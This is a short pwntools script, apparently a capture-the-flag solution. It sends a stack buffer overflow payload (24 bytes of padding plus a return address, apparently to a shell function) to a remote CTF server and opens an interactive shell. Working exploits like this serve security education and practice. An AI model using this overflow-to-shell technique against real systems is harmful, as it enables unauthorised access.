from pwn import *

r = remote("csie.ctf.tw",10120)

n = 24
shell = 0x400566
payload = b'a' * n + p64(shell)

r.send(payload)
r.interactive()
